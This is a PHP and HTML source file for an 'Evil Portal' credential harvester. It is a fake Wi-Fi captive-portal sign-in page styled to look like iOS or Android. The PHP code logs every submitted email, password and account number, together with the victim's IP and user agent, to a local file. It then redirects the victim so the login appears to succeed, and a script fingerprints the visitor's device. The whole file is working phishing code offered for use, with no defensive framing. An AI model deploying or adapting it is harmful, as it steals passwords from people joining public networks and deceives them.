<?php
// Evil Portal Universal Harvester
// Captures creds, logs them, grants "access"

$logFile = "/tmp/evilportal.log";
$clientIP = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date("Y-m-d H:i:s");

// Determine target network aesthetic from Referer or Host
$targetHost = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : "Network";
$networkName = "Guest_Network";

// Auto-detect common network signatures
if (strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false) {
    $platform = "ios";
} elseif (strpos($userAgent, 'Android') !== false) {
    $platform = "android";
} else {
    $platform = "generic";
}

// Harvest submitted credentials
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $captured = [];
    foreach ($_POST as $key => $value) {
        $captured[$key] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    }

    $logEntry = sprintf(
        "[%s] IP: %s | UA: %s | DATA: %s\n",
        $timestamp,
        $clientIP,
        substr($userAgent, 0, 80),
        json_encode($captured)
    );

    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

    // Grant "access" — redirect to real internet or a success page
    header("Location: http://example.com?auth=success");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In — <?php echo $networkName; ?></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1d1d1f;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 18px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
            width: 90%;
            max-width: 380px;
            text-align: center;
        }
        .logo {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
            border-radius: 16px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 28px;
            font-weight: 600;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        p.subtitle {
            color: #86868b;
            font-size: 15px;
            margin-bottom: 32px;
            line-height: 1.4;
        }
        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #1d1d1f;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #d2d2d7;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.2s;
            background: #fbfbfd;
        }
        input:focus {
            outline: none;
            border-color: #007AFF;
            background: white;
            box-shadow: 0 0 0 4px rgba(0,122,255,0.15);
        }
        button {
            width: 100%;
            padding: 16px;
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: transform 0.1s, background 0.2s;
        }
        button:hover { background: #0051D5; }
        button:active { transform: scale(0.98); }
        .footer {
            margin-top: 24px;
            font-size: 13px;
            color: #86868b;
        }
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* Android variant overrides */
        body.android .container { border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
        body.android .logo { border-radius: 50%; background: #1a73e8; }
        body.android button { border-radius: 4px; text-transform: uppercase; font-size: 14px; letter-spacing: 1px; background: #1a73e8; }
    </style>
</head>
<body class="<?php echo $platform; ?>">
    <div class="container">
        <div class="logo">WiFi</div>
        <h1>Sign In</h1>
        <p class="subtitle">Connect to <?php echo $networkName; ?> to continue</p>

        <form method="POST" action="" onsubmit="showLoading()">
            <div class="input-group">
                <label>Email or Phone</label>
                <input type="text" name="identity" placeholder="Enter your email" required autocomplete="username">
            </div>

            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
            </div>

            <div class="input-group">
                <label>Room / Account Number (Optional)</label>
                <input type="text" name="account" placeholder="For hotel/corporate networks">
            </div>

            <button type="submit" id="submitBtn">
                <span id="btnText">Connect</span>
                <div class="spinner" id="spinner"></div>
            </button>
        </form>

        <div class="footer">
            By connecting, you agree to the Terms of Service and Privacy Policy.
        </div>
    </div>

    <script>
        function showLoading() {
            document.getElementById('btnText').style.display = 'none';
            document.getElementById('spinner').style.display = 'block';
            document.getElementById('submitBtn').style.opacity = '0.8';
        }

        // Fingerprint and log client info via AJAX for non-form data
        fetch('/api/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                screen: screen.width + 'x' + screen.height,
                lang: navigator.language,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || 'unknown'
            })
        }).catch(() => {});
    </script>
</body>
</html>
